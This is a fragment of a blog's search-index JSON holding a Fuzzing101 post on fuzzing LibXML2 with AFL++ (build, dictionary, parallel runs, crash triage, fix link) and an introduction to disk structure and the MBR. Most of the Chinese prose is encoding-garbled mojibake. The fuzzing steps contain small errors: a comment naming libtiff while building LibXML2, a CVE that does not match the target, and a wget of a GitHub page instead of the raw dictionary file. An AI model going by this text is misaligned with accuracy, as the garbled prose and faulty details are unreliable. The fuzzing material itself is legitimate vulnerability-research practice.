5","uri":"/2020/12/fuzzing101-5/"},{"categories":["Fuzz"],"content":"æœ¬æ–‡æ˜¯Fuzzing101ç³»åˆ—ç¬¬äº”ç¯‡ï¼Œfuzzçš„å¯¹è±¡ä¸º LibXML2 ã€‚ ","date":"2020-12-17","objectID":"/2020/12/fuzzing101-5/:0:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/2020/12/fuzzing101-5/"},{"categories":["Fuzz"],"content":"1. Basic Info Target CVES to find Time estimated Main topics LibXML2 CVE-2017-9048 3hous measure the code coverage data CVE-2017-13028: Out-of-bounds Read vulneratibily. ","date":"2020-12-17","objectID":"/2020/12/fuzzing101-5/:1:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/2020/12/fuzzing101-5/"},{"categories":["Fuzz"],"content":"2. Learning Target åœ¨fuzzerä¸­ä½¿ç”¨è‡ªå®šä¹‰è¯å…¸ ä½¿ç”¨å¤šä¸ªå†…æ ¸å¹¶è¡Œè¿›è¡Œfuzz ","date":"2020-12-17","objectID":"/2020/12/fuzzing101-5/:2:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/2020/12/fuzzing101-5/"},{"categories":["Fuzz"],"content":"3. Fuzzing ","date":"2020-12-17","objectID":"/2020/12/fuzzing101-5/:3:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/2020/12/fuzzing101-5/"},{"categories":["Fuzz"],"content":"1. Workflow æ‰¾åˆ°ä¸€ä¸ªä½¿ç”¨LibXML2å…±äº«åº“çš„åº”ç”¨ç¨‹åº å¤åˆ¶SampleInput.xmlæ–‡ä»¶åˆ°AFLçš„inputç›®å½• åˆ›å»ºfuzzing XMLçš„å¸¸è§„ç›®å½• å¼€å§‹fuzzï¼Œç›´åˆ°å‡ºç°crash ä½¿ç”¨é€ æˆcrashçš„pocé‡ç°crash ä¿®å¤æ¼æ´ ","date":"2020-12-17","objectID":"/2020/12/fuzzing101-5/:3:1","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/2020/12/fuzzing101-5/"},{"categories":["Fuzz"],"content":"2. Solution 1. Download and build target é¦–å…ˆåˆ›å»ºå¾…fuzzçš„LibXML2ç¯å¢ƒï¼Œè¿›è¡Œç¼–è¯‘å¾…ç”¨ï¼š cd $HOME mkdir Fuzzing_libxml2 \u0026\u0026 cd Fuzzing_libxml2 # download and uncompress the target wget http://xmlsoft.org/download/libxml2-2.9.4.tar.gz tar xvf libxml2-2.9.4.tar.gz \u0026\u0026 cd libxml2-2.9.4/ # build and install libtiff sudo apt-get install python-dev CC=afl-clang-lto CXX=afl-clang-lto++ CFLAGS=\"-fsanitize=address\" CXXFLAGS=\"-fsanitize=address\" LDFLAGS=\"-fsanitize=address\" ./configure --prefix=\"$HOME/Fuzzing_libxml2/libxml2-2.9.4/install\" --disable-shared --without-debug --without-ftp --without-http --without-legacy --without-python LIBS='-ldl' make -j$(nproc) make install # test the target program ./xmllint --memory ./test/wml.xml ä»¥ä¸Šå®‰è£…ä¸æŠ¥é”™çš„è¯ï¼Œå¯ä»¥æ­£å¸¸è°ƒç”¨LibXMLåº“ ï¼š æ³¨æ„ä¸€ä¸‹ä¸Šé¢çš„warningï¼Œæœ‰æç¤ºå¦‚æœå‡ºç°AFL++å´©æºƒçš„æƒ…å†µï¼Œå¯ä»¥è€ƒè™‘è®²AFL_MAP_SIZEçš„å¤§å°è®¾ç½®ä¸º146056. 2. Seed corpus creation è¿™é‡Œç›´æ¥ä½¿ç”¨SampleInput.xmlåšä¸ºXMLçš„æ ·ä¾‹ï¼š \u003c!DOCTYPE a []\u003e 3. Custom dictionary è¿™é‡Œç›´æ¥ä½¿ç”¨AFL++æä¾›çš„XMLçš„dictï¼š mkdir dictionaries \u0026\u0026 cd dictionaries wget https://github.com/AFLplusplus/AFLplusplus/blob/stable/dictionaries/xml.dict cd .. 4. Fuzzing æ‰§è¡Œ afl-fuzz ï¼Œé‡‡ç”¨å¹¶è¡Œæ–¹å¼è¿›è¡Œfuzz: afl-fuzz -m none -i ./afl_in -o afl_out -s 123 -x ./dictionaries/xml.dict -M master -- ./xmllint --memory --noenc --nocdata --dtdattr --loaddtd --valid --xinclude @@ afl-fuzz -m none -i ./afl_in -o afl_out -s 234 -x ./dictionaries/xml.dict -S slave1 -- ./xmllint --memory --noenc --nocdata --dtdattr --loaddtd --valid --xinclude @@ ","date":"2020-12-17","objectID":"/2020/12/fuzzing101-5/:3:2","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/2020/12/fuzzing101-5/"},{"categories":["Fuzz"],"content":"3. Crashes æœ€ç»ˆæ²¡æœ‰è·‘å‡ºæ¥crashï¼ˆè‚¯å®šæ˜¯å“ªé‡Œå‡ºäº†é—®é¢˜ï¼‰ï¼š ","date":"2020-12-17","objectID":"/2020/12/fuzzing101-5/:3:3","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/2020/12/fuzzing101-5/"},{"categories":["Fuzz"],"content":"4. Triage è¿™é‡Œç›´æ¥ä½¿ç”¨çš„æ˜¯æ•™ç¨‹é‡Œçš„ï¼š ./xmllint --memory --noenc --nocdata --dtdattr --loaddtd --valid --xinclude './afl_out/default/crashes/id:000000,sig:06,src:003963,time:12456489,op:havoc,rep:4' ","date":"2020-12-17","objectID":"/2020/12/fuzzing101-5/:4:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/2020/12/fuzzing101-5/"},{"categories":["Fuzz"],"content":"5. Fix å®˜æ–¹çš„ä¿®å¤åœ°å€ï¼š https://github.com/GNOME/libxml2/commit/932cc9896ab41475d4aa429c27d9afd175959d74 åç»­å°†å¯¹è¯¥æ¼æ´è¿›è¡Œæ·±å…¥åˆ†æå’Œè¡¥ä¸åˆ†æï¼Œå¾…å®Œå–„ã€‚ ","date":"2020-12-17","objectID":"/2020/12/fuzzing101-5/:5:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/2020/12/fuzzing101-5/"},{"categories":["Misc"],"content":"MBRç®€ä»‹","date":"2020-12-14","objectID":"/2020/12/mbr/","tags":["Linux"],"title":"MBRç®€ä»‹","uri":"/2020/12/mbr/"},{"categories":["Misc"],"content":"MBRç®€ä»‹ ","date":"2020-12-14","objectID":"/2020/12/mbr/:0:0","tags":["Linux"],"title":"MBRç®€ä»‹","uri":"/2020/12/mbr/"},{"categories":["Misc"],"content":"ä¸€ã€ç£ç›˜ç»“æ„ ","date":"2020-12-14","objectID":"/2020/12/mbr/:1:0","tags":["Linux"],"title":"MBRç®€ä»‹","uri":"/2020/12/mbr/"},{"categories":["Misc"],"content":"1ã€ç£ç›˜çš„ç‰©ç†ç»“æ„ ç£ç›˜ç»“æ„å¯åˆ†ä¸ºå¤–éƒ¨ç»“æ„å’Œå†…éƒ¨ç»“æ„ï¼Œå¤–éƒ¨ç»“æ„ä¸»è¦åŒ…æ‹¬é‡‘å±å›ºå®šé¢æ¿ã€æ§åˆ¶ç”µè·¯æ¿å’Œæ¥å£ä¸‰éƒ¨åˆ†ï¼š å…¶ä¸­æ§åˆ¶ç”µè·¯æ¿éƒ¨åˆ†åŒ…æ‹¬äº†ä¸»è½´è°ƒé€Ÿç”µè·¯ã€ç£å¤´é©±åŠ¨ä¸ä¼ºæœå®šä½ç”µè·¯ã€è¯»å†™ç”µè·¯ã€æ§åˆ¶ä¸æ¥å£ç”µè·¯ç­‰ï¼Œå‡ ä¸ªä¸»è¦çš„èŠ¯ç‰‡ï¼šä¸»æ§èŠ¯ç‰‡ã€BIOSèŠ¯ç‰‡ã€ç¼“å­˜èŠ¯ç‰‡ã€ç”µæœºé©±åŠ¨èŠ¯ç‰‡ï¼›æ¥å£éƒ¨åˆ†åˆ™ä¸€èˆ¬æœ‰å‡ ä¸ªä¸åŒçš„ç¡¬ç›˜æ¥å£ï¼Œä¸»è¦åŒ…æ‹¬ç”µæºæ’åº§æ¥å£ã€æ•°æ®æ¥å£å’Œä¸»ä»è·³çº¿æ¥å£ï¼ˆè®¾ç½®ä¸»ã€ä»ç¡¬ç›˜ï¼Œå³ç£ç›˜é©±åŠ¨å™¨çš„è®¿é—®é¡ºåºï¼‰ã€‚ ç£ç›˜çš„å†…éƒ¨ç»“æ„å¦‚ä¸‹ï¼š å†…éƒ¨ç»“æ„åˆ™ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªæ ¸å¿ƒéƒ¨ä»¶ï¼š 1. ç£å¤´ç»„ä»¶ åŒ…æ‹¬è¯»å†™ç£å¤´ã€ä¼ åŠ¨æ‰‹è‡‚ã€ä¼ åŠ¨è½´ä¸‰éƒ¨åˆ†ï¼Œæœ€é‡è¦çš„æ˜¯ç£å¤´ã€‚ä¼ åŠ¨è½´å¸¦åŠ¨ä¼ åŠ¨æ¯”ï¼Œä½¿ç£å¤´åˆ°è¾¾æŒ‡å®šä½ç½®ã€‚ç£å¤´æ˜¯ç”¨çº¿åœˆç¼ ç»•åœ¨ç£èŠ¯ä¸Šåˆ¶æˆçš„ï¼Œå·¥ä½œåŸç†æ˜¯åˆ©ç”¨ç‰¹æ®Šææ–™çš„ç”µé˜»å€¼ä¼šéšç€ç£åœºå˜åŒ–çš„åŸç†æ¥è¯»å†™ç›˜ç‰‡ä¸Šçš„æ•°æ®ã€‚ç¡¬ç›˜åœ¨å·¥ä½œæ—¶ï¼Œç£å¤´é€šè¿‡æ„Ÿåº”æ—‹è½¬çš„ç›˜ç‰‡ä¸Šç£åœºçš„å˜åŒ–æ¥è¯»å–æ•°æ®ï¼›é€šè¿‡æ”¹å˜ç›˜ç‰‡ä¸Šçš„ç£åœºæ¥å†™å…¥æ•°æ®ã€‚ä¸ºé¿å…ç£å¤´å’Œç›˜ç‰‡çš„ç£¨æŸï¼Œåœ¨å·¥ä½œçŠ¶æ€æ—¶ï¼Œç£å¤´æ‚¬æµ®åœ¨é«˜é€Ÿè½¬åŠ¨çš„ç›˜ç‰‡ä¸Šæ–¹ï¼Œé—´éš™åªæœ‰0.1~0.3umï¼Œè€Œä¸æ˜¯ç›˜ç‰‡ç›´æ¥æ¥è§¦ï¼Œåœ¨ç”µæºå…³é—­ä¹‹åï¼Œç£å¤´ä¼šè‡ªåŠ¨å›åˆ°åœ¨ç›˜ç‰‡ä¸Šç€é™†åŒºï¼Œæ­¤å¤„ç›˜ç‰‡å¹¶ä¸å­˜å‚¨æ•°æ®ï¼Œæ˜¯ç›˜ç‰‡çš„èµ·å§‹ä½ç½®ã€‚ 2. ç£å¤´é©±åŠ¨ç»„ä»¶ ç£å¤´çš„ç§»åŠ¨æ˜¯é ç£å¤´é©±åŠ¨ç»„ä»¶å®ç°çš„ï¼Œç¡¬ç›˜å¯»é“æ—¶é—´çš„é•¿çŸ­ä¸ç£å¤´é©±åŠ¨ç»„ä»¶å…³ç³»éå¸¸å¯†åˆ‡ã€‚ 3. ç›˜ç‰‡ä¸ä¸»è½´ç»„ä»¶ ç›˜ç‰‡æ˜¯ç¡¬ç›˜å­˜å‚¨æ•°æ®çš„è½½ä½“ï¼Œä¸»è¦æ˜¯åœ¨é“åˆé‡‘æˆ–ç»ç’ƒåŸºåº•ä¸Šæ¶‚è¦†å¾ˆè–„çš„ç£æ€§ææ–™ã€ä¿æŠ¤ææ–™å’Œæ¶¦æ»‘ææ–™ç­‰å¤šç§ä¸åŒä½œç”¨çš„ææ–™å±‚åŠ å·¥è€Œæˆï¼Œå…¶ä¸­ç£æ€§ææ–™çš„ç‰©ç†æ€§èƒ½å’Œç£å±‚ç»“æ„ç›´æ¥å½±å“äº†æ•°æ®çš„å­˜å‚¨å¯†åº¦å’Œæ‰€å­˜å‚¨æ•°æ®çš„ç¨³å®šæ€§ã€‚ç»ç’ƒç›˜ç‰‡æ¯”é‡‘å±ç›˜ç‰‡åœ¨è¿è¡Œæ—¶å…·æœ‰æ›´å¥½çš„ç¨³å®šæ€§ã€‚ 4. å‰ç½®æ§åˆ¶ç”µè·¯ å‰ç½®æ”¾å¤§ç”µè·¯æ§åˆ¶ç£å¤´æ„Ÿåº”çš„ä¿¡å·ã€ä¸»è½´ç”µæœºè°ƒé€Ÿã€ç£å¤´é©±åŠ¨å’Œä¼ºæœå®šä½ç­‰ï¼Œç”±äºç£å¤´è¯»å–çš„ä¿¡å·å¾®å¼±ï¼Œå°†æ”¾å¤§ç”µè·¯å¯†å°åœ¨è…”ä½“å†…å¯å‡å°‘å¤–æ¥ä¿¡å·çš„å¹²æ‰°ï¼Œæé«˜æ“ä½œæŒ‡ä»¤çš„å‡†ç¡®æ€§ã€‚ ","date":"2020-12-14","objectID":"/2020/12/mbr/:1:1","tags":["Linux"],"title":"MBRç®€ä»‹","uri":"/2020/12/mbr/"},{"categories":["Misc"],"content":"2ã€é€»è¾‘ç»“æ„ ç£ç›˜åœ¨ä½¿ç”¨å‰éœ€è¦å…ˆè¿›è¡Œæ ¼å¼åŒ–ï¼Œè¯¥è¿‡ç¨‹ä¸»è¦æ˜¯åœ¨é€»è¾‘ä¸Šä¸ºæ¯ä¸ªç›˜ç‰‡åˆ’åˆ†ç£é“ã€æ‰‡åŒºã€æŸ±é¢ç­‰è¿™å‡ ä¸ªè™šæ‹Ÿæ¦‚å¿µã€‚ä¸‹å›¾ä¸ºç£ç›˜çš„é€»è¾‘ç»“æ„ï¼š ç£é“ å½“ç£ç›˜æ—‹è½¬æ—¶ï¼Œç£å¤´è‹¥ä¿æŒåœ¨ä¸€ä¸ªä½ç½®ä¸Šï¼Œåˆ™æ¯ä¸ªç£å¤´éƒ½ä¼šåœ¨ç£ç›˜è¡¨é¢åˆ’å‡ºä¸€ä¸ªåœ†å½¢è½¨è¿¹ï¼Œè¯¥è½¨è¿¹å°±ç§°ä¸ºç£é“ã€‚ç£é“æ˜¯ä¸€ä¸ªä¸ªåŒå¿ƒåœ†ï¼Œé€šå¸¸ç›˜é¢çš„ä¸€é¢æœ‰æˆåƒä¸Šä¸‡ä¸ªç£é“ï¼Œç£ç›˜ä¸Šçš„ä¿¡æ¯æ˜¯æ²¿ç€è½¨é“è¿›è¡Œå­˜æ”¾ï¼Œç›¸é‚»çš„ç£é“é—´ä¿æŒä¸€å®šè·ç¦»ï¼Œé¿å…ç£åŒ–å•å…ƒç›¸è¿‘æ—¶ä¼šäº’ç›¸å½±å“ï¼Œä¹Ÿä¸ºç£å¤´è¿›è¡Œæ•°æ®è¯»å†™æ—¶é™ä½éš¾åº¦ã€‚ æ‰‡åŒº æ¯ä¸ªç›˜ç‰‡çš„æ¯ä¸€é¢éƒ½ä¼šåˆ’åˆ†å¾ˆå¤šåŒå¿ƒåœ†çš„ç£é“ï¼Œè€Œä¸”è¿˜ä¼šå°†æ¯ä¸ªåŒå¿ƒåœ†è¿›ä¸€æ­¥åˆ†å‰²ä¸ºå¤šä¸ªç›¸ç­‰çš„åœ†å¼§ï¼Œè¿™äº›åœ†å¼§å°±æ˜¯æ‰‡åŒºï¼ˆä¹Ÿç§°æ‰‡é¢ï¼‰ã€‚æ•°æ®åˆ™ä»¥æ‰‡åŒºä¸ºå•ä½è¿›è¡Œå­˜å‚¨ï¼Œæ‰‡åŒºä¹Ÿæ˜¯ç£ç›˜I/Oæ“ä½œçš„æœ€å°å•ä½ï¼ˆå³ä½¿åªéœ€è¦æŸä¸ªæ‰‡åŒºçš„å‡ ä¸ªå­—èŠ‚ï¼Œè®¡ç®—æœºä¹Ÿå¿…é¡»ä¸€æ¬¡æ€§å°†æ•´ä¸ªæ‰‡åŒºçš„å…¨éƒ¨512å­—èŠ‚è¯»å…¥å†…å­˜ï¼Œç„¶åå†è¿›è¡Œæ•°æ®ç­›é€‰ã€‚ï¼‰ã€‚æ‰‡åŒºé€šå¸¸åŒ…å«æ ‡é¢˜ã€æ•°æ®ã€ECC(Error Correcting Code)çº é”™ä¿¡æ¯ï¼Œå…¶ä¸­æ ‡é¢˜åŒ…å«åŒæ­¥å’Œä½ç½®ä¿¡æ¯ï¼ŒECCåŠŸç”¨æ˜¯å¯¹æ•°æ®æ®µæä¾›é”™è¯¯ä¾¦æµ‹å’Œçº æ­£ã€‚ æŸ±é¢ ç¡¬ç›˜é€šå¸¸ç”±ä¸€ä¸ªæˆ–å¤šä¸ªç›˜ç‰‡æ„æˆï¼Œè€Œä¸”æ¯ä¸ªé¢éƒ½è¢«åˆ’åˆ†ä¸ºæ•°ç›®ç›¸ç­‰çš„ç£é“ï¼Œå¹¶ä»å¤–ç¼˜å¼€å§‹ç¼–å·ï¼ˆå³æœ€è¾¹ç¼˜çš„ç£é“ä¸º0ç£é“ï¼Œå¾€é‡Œä¾æ¬¡ç´¯åŠ ï¼‰ã€‚å¦‚æ­¤ç£ç›˜ä¸­å…·æœ‰ç›¸åŒç¼–å·çš„ç£é“ä¼šå½¢æˆä¸€ä¸ªåœ†æŸ±ï¼Œæ­¤åœ†æŸ±ç§°ä¸ºç£ç›˜çš„æŸ±é¢ã€‚ç£ç›˜çš„æŸ±é¢æ•°ä¸ä¸€ä¸ªç›˜é¢ä¸Šçš„ç£é“æ•°æ˜¯ç›¸ç­‰çš„ã€‚ç”±äºæ¯ä¸ªç›˜é¢éƒ½æœ‰ä¸€ä¸ªç£å¤´ï¼Œå› æ­¤ï¼Œç›˜é¢æ•°ç­‰äºæ€»çš„ç£å¤´æ•°ã€‚ å¯¹ç£ç›˜è¿›è¡Œåˆ†åŒºçš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†ä¸åŒç±»çš„ç›®å½•ä¸æ–‡ä»¶å¯ä»¥å­˜å‚¨è¿›ä¸åŒçš„åˆ†åŒºï¼Œè¶Šå¤šåˆ†åŒºï¼Œä¹Ÿå°±æœ‰æ›´å¤šä¸åŒçš„åœ°æ–¹ï¼Œå¯ä»¥å°†æ–‡ä»¶çš„æ€§è´¨åŒºåˆ†å¾—æ›´ç»†ï¼ŒæŒ‰ç…§æ›´ä¸ºç»†åˆ†çš„æ€§è´¨ï¼Œå­˜å‚¨åœ¨ä¸åŒçš„åœ°æ–¹ä»¥ç®¡ç†æ–‡ä»¶ã€‚æ€»ç»“ä¸‹åˆ†åŒºçš„ä¼˜ç‚¹ï¼š ä¼˜åŒ–I/Oæ€§èƒ½ å®ç°ç£ç›˜ç©ºé—´é…é¢é™åˆ¶ æé«˜ä¿®å¤é€Ÿåº¦ éš”ç¦»ç³»ç»Ÿå’Œç¨‹åº å®‰è£…å¤šä¸ªOS é‡‡ç”¨ä¸ç”¨çš„æ–‡ä»¶ç³»ç»Ÿ ç£ç›˜ç»“æ„çš„3Då‚æ•°ï¼šCHSï¼ŒC-Cylinderï¼ŒæŸ±é¢ï¼›H-Headï¼Œç£å¤´ï¼›S-Sectorï¼Œæ‰‡åŒºã€‚ æœ€åæ˜¯ç£ç›˜çš„å®¹é‡ = æŸ±é¢æ•° * ç£å¤´æ•° * æ‰‡åŒºæ•° * 512Bytes ï¼Œç›¸å…³çš„ç¼–å·æ–¹å¼æ˜¯ï¼šç£é“ä»å¤–åˆ°å†…ç¼–å·ï¼Œæœ€å¤–å±‚æ˜¯0å·ç£é“ï¼›æ‰‡åŒºçš„ç¼–å·ä¸ºå›ºå®šæ ‡è®°æŸå—ä¸º1å·ï¼Œç„¶åé¡ºæ—¶é’ˆç¼–å·ï¼›ç£å¤´åˆ™æ˜¯å†³å®šè¯»å†™é¢å·çš„ç»“æ„ï¼Œä»0å¼€å§‹é¡ºåºç¼–å·ã€‚ åœ¨è€å¼ç£ç›˜ä¸­ï¼Œè™½ç„¶ç£é“å‘¨é•¿ä¸åŒï¼Œä½†æ˜¯æ¯ä¸ªç£é“ä¸Šçš„æ‰‡åŒºæ•°æ˜¯ç›¸åŒçš„ï¼Œè¶Šå¾€åœ†å¿ƒæ‰‡åŒºå¼§æ®µè¶ŠçŸ­ï¼Œä½†å…¶å­˜å‚¨å¯†åº¦è¶Šé«˜ã€‚è¿™ç§æ–¹å¼æ˜¾è€Œæ˜“è§ï¼Œå¾ˆæµªè´¹ç©ºé—´ï¼Œæ‰€ä»¥ç°ä»£ç£ç›˜ä¿®æ”¹ä¸ºç­‰å¯†åº¦ç»“æ„ï¼Œè¿™ä¹Ÿå°±æ˜¯è¯´ï¼Œå¤–å›´ç£é“ä¸Šçš„æ‰‡åŒºæ•°è¦å¤§äºå†…åœˆç£é“çš„æ‰‡åŒºæ•°ï¼Œå¯»å€æ–¹å¼ä¸Šä¹Ÿæ”¹ä¸ºä»¥æ‰‡åŒºä¸ºå•ä½çš„çº¿æ€§å¯»å€ã€‚ ","date":"2020-12-14","objectID":"/2020/12/mbr/:1:2","tags":["Linux"],"title":"MBRç®€ä»‹","uri":"/2020/12/mbr/"},{"categories":["Misc"],"content":"äºŒã€MBR ç£ç›˜æœ‰2ç§åˆ†åŒºæ–¹å¼ï¼šMBRå’ŒGPTã€‚MBRï¼Œå…¨ç§°ä¸ºMaster Boot Recordï¼Œä¸»å¼•å¯¼è®°å½•ï¼Œæ˜¯æŒ‡ç£ç›˜ç¬¬1å—æ‰‡åŒºä¸Šçš„ä¸€ç§æ•°æ®ç»“æ„ã€‚å®ƒåœ¨ç£ç›˜ä¸Šçš„ä¸‰ç»´åœ°å€ï¼ˆæŸ±é¢ï¼Œç£å¤´ï¼Œæ‰‡åŒºï¼‰ = ï¼ˆ0ï¼Œ0ï¼Œ1ï¼‰ã€‚è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œåœ¨è®¨è®ºå¼•å¯¼æ‰‡åŒºå†…éƒ¨ç»“æ„çš„æ—¶å€™ï¼Œæœ‰æ—¶æŒ‡çš„å…¶å¼€å¤´çš„446å­—èŠ‚å†…å®¹ï¼Œå…¶å4ä¸ª16å­—èŠ‚çš„æ•°æ®æ˜¯ç£ç›˜åˆ†åŒºè¡¨ï¼ˆDPTï¼‰ï¼Œä»¥åŠ2å­—èŠ‚çš„ç»“æŸæ ‡å¿—â€œ55AAâ€ã€‚ ","date":"2020-12-14","objectID":"/2020/12/mbr/:2:0","tags":["Linux"],"title":"MBRç®€ä»‹","uri":"/2020/12/mbr/"},{"categories":["Misc"],"content":"1. MBRç»“æ„ MBRè®°å½•äº†ç£ç›˜æœ¬èº«çš„ç›¸å…³ä¿¡æ¯ä»¥åŠç£ç›˜å„ä¸ªåˆ†åŒºçš„å¤§å°åŠä½ç½®ä¿¡æ¯ã€‚MBRå†…çš„ä¿¡æ¯å¯ä»¥é€šè¿‡ä»»ä½•ä¸€ç§åŸºäºæŸç§æ“ä½œç³»ç»Ÿçš„åˆ†åŒºå·¥å…·è½¯ä»¶å†™å…¥ï¼Œå’ŒOSæ²¡æœ‰ç‰¹å®šå…³ç³»ï¼Œå³åªè¦åˆ›å»ºäº†æœ‰æ•ˆçš„MBRå°±å¯ä»¥å¼•å¯¼æŸä¸€ç§OSï¼ˆå› ä¸ºOSæ˜¯åˆ›å»ºåœ¨é«˜çº§æ ¼å¼åŒ–çš„ç£ç›˜åˆ†åŒºä¸Šçš„ï¼Œæ˜¯å’Œä¸€å®šçš„æ–‡ä»¶ç³»ç»Ÿç›¸å…³è”çš„ï¼‰ã€‚ ä¸€ä¸ªæ ‡å‡†çš„MBRç»“æ„å¦‚ä¸‹ï¼š é¦–å…ˆä½¿ç”¨dd if=/dev/sda of=mbr.bin bs=1 count=512å‘½ä»¤å°†mbrä¸­çš„æ•°æ®å¯¼å‡ºæˆmbr.binåï¼Œç„¶åä½¿ç”¨hexdumpæŸ¥çœ‹binæ–‡ä»¶ä¸­çš„æ•°æ®ï¼š åç»­å°†å¯¹è¯¥æ–‡ä»¶ä¸­çš„å„ä¸ªéƒ¨åˆ†çš„æ•°æ®åšè¯¦ç»†è§£è¯»ã€‚ ","date":"2020-12-14","objectID":"/2020/12/mbr/:2:1","tags":["Linux"],"title":"MBRç®€ä»‹","uri":"/2020/12/mbr/"},{"categories":["Misc"],"content":"2. MBRä¸ç£ç›˜åˆ†åŒº MBRçš„åˆ†åŒºæ–¹å¼ä¸º4ä¸ªä¸»åˆ†åŒºæˆ–3ä¸ªä¸»åˆ†åŒº+1ä¸ªæ‰©å±•ï¼ˆNä¸ªé€»è¾‘åˆ†åŒºï¼‰ã€‚MBRç£ç›˜åˆ†åŒºçš„ç»“æ„ç¤ºæ„å›¾å¦‚ä¸‹ï¼š å› ä¸ºMBRä»…ä»…åŒ…å«ä¸€ä¸ª64å­—èŠ‚å¤§å°çš„DPTï¼Œè€Œæ¯ä¸ªåˆ†åŒºéœ€è¦16å­—èŠ‚ï¼Œæ‰€å¯¹äºé‡‡ç”¨MBRå‹åˆ†åŒºçš„ç£ç›˜æœ€å¤šåªèƒ½è¯†åˆ«4ä¸ªä¸»è¦åˆ†åŒºï¼ˆPrimary partitionï¼‰ã€‚å¦‚æœæƒ³è·å¾—4ä¸ªä»¥ä¸Šçš„ä¸»è¦åˆ†åŒºï¼Œå°±éœ€è¦ä½¿ç”¨æ‰©å±•åˆ†åŒºï¼Œæ‰©å±•åˆ†åŒºä¹Ÿæ˜¯ä¸»åˆ†åŒºçš„ä¸€ç§ï¼Œä¸åŒç‚¹æ˜¯æ‰©å±•åˆ†åŒºå¯ä»¥åœ¨ç†è®ºä¸Šåˆ’åˆ†æˆæ— æ•°ä¸ªé€»è¾‘åˆ†åŒºã€‚ æ‰©å±•åˆ†åŒºï¼Œå®ƒä»…ä»…æ˜¯ä¸€ä¸ªæŒ‡å‘ä¸‹ä¸€ä¸ªåˆ†åŒºçš„æŒ‡é’ˆï¼Œé€»è¾‘é©±åŠ¨å™¨çš„å¼•å¯¼è®°å½•æ˜¯é“¾å¼çš„ã€‚æ¯ä¸€ä¸ªé€»è¾‘åˆ†åŒºéƒ½æœ‰ä¸€ä¸ªå’ŒMBRç»“æ„ç±»ä¼¼çš„æ‰©å±•å¼•å¯¼è®°å½•ï¼ˆEBRï¼‰ï¼Œå…¶åˆ†åŒºè¡¨çš„ç¬¬ä¸€é¡¹æŒ‡å‘è¯¥é€»è¾‘åˆ†åŒºæœ¬èº«çš„å¼•å¯¼æ‰‡åŒºï¼Œç¬¬äºŒé¡¹æŒ‡å‘ä¸‹ä¸€ä¸ªé€»è¾‘é©±åŠ¨å™¨çš„EBRï¼Œåˆ†åŒºè¡¨ç¬¬ä¸‰ã€ç¬¬å››é¡¹æ²¡æœ‰ç”¨åˆ°ã€‚ Windowsç³»ç»Ÿé»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€èˆ¬éƒ½æ˜¯åªåˆ’åˆ†ä¸€ä¸ªä¸»åˆ†åŒºç»™ç³»ç»Ÿï¼Œå‰©ä½™çš„éƒ¨åˆ†å…¨éƒ¨åˆ’å…¥æ‰©å±•åˆ†åŒºã€‚è¿™é‡Œæœ‰ä¸‹é¢å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š åœ¨MBRåˆ†åŒºè¡¨ä¸­æœ€å¤š4ä¸ªä¸»åˆ†åŒºæˆ–è€…3ä¸ªä¸»åˆ†åŒºï¼‹1ä¸ªæ‰©å±•åˆ†åŒºï¼Œä¹Ÿå°±æ˜¯è¯´æ‰©å±•åˆ†åŒºåªèƒ½æœ‰ä¸€ä¸ªï¼Œç„¶åå¯ä»¥å†ç»†åˆ†ä¸ºå¤šä¸ªé€»è¾‘åˆ†åŒºã€‚ åœ¨Linuxç³»ç»Ÿä¸­ï¼Œç£ç›˜åˆ†åŒºå‘½åä¸ºsda1ï¼sda4æˆ–è€…hda1ï¼hda4ï¼ˆå…¶ä¸­aè¡¨ç¤ºç£ç›˜ç¼–å·å¯èƒ½æ˜¯aã€bã€cç­‰ç­‰ï¼‰ã€‚åœ¨MBRç£ç›˜ä¸­ï¼Œåˆ†åŒºå·1ï¼4æ˜¯ä¸»åˆ†åŒºï¼ˆæˆ–è€…æ‰©å±•åˆ†åŒºï¼‰ï¼Œé€»è¾‘åˆ†åŒºå·åªèƒ½ä»5å¼€å§‹ã€‚ åœ¨MBRåˆ†åŒºè¡¨ä¸­ï¼Œä¸€ä¸ªåˆ†åŒºæœ€å¤§çš„å®¹é‡ä¸º2Tï¼Œä¸”æ¯ä¸ªåˆ†åŒºçš„èµ·å§‹æŸ±é¢å¿…é¡»åœ¨è¿™ä¸ªdiskçš„å‰2Tå†…ã€‚ä½ æœ‰ä¸€ä¸ª3Tçš„ç£ç›˜ï¼Œæ ¹æ®è¦æ±‚ä½ è‡³å°‘è¦æŠŠå®ƒåˆ’åˆ†ä¸º2ä¸ªåˆ†åŒºï¼Œä¸”æœ€åä¸€ä¸ªåˆ†åŒºçš„èµ·å§‹æ‰‡åŒºè¦ä½äºç£ç›˜çš„å‰2Tç©ºé—´å†…ã€‚å¦‚æœç£ç›˜å¤ªå¤§åˆ™å¿…é¡»æ”¹ç”¨GPTã€‚ ","date":"2020-12-14","objectID":"/2020/12/mbr/:2:2","tags":["Linux"],"title":"MBRç®€ä»‹","uri":"/2020/12/mbr/"},{"categories":["Misc"],"content":"3. MBRç»„æˆ 1. å¯åŠ¨ä»£ç  MBRæœ€å¼€å¤´æ˜¯ç¬¬ä¸€é˜¶æ®µå¼•å¯¼ä»£ç 